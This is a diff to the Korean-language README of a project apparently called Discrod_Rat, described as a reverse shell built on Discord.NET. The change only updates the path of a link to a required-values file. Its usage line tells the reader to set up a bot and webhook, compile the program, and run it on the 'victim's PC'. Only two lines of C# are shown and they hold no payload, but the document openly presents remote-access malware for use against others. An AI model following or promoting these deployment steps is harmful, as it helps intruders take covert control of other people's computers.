@@ -2,7 +2,7 @@
 
 Discord.NET 을 이용한 reverse shell
 ## Usage
-[필수값](https://github.com/root1234567891234/Discrod_Rat/blob/master/AntiMalware/value.cs)을 수정해 봇,후크와 연동한후 컴파일 그리고 피해자PC에서 실행시키세요
+[필수값](https://github.com/root1234567891234/Discrod_Rat/blob/master/AntiMalware/class/value.cs)을 수정해 봇,후크와 연동한후 컴파일 그리고 피해자PC에서 실행시키세요
 ```C# 8
 private static GET GET = new GET();
 // 본 프로그램의 이름
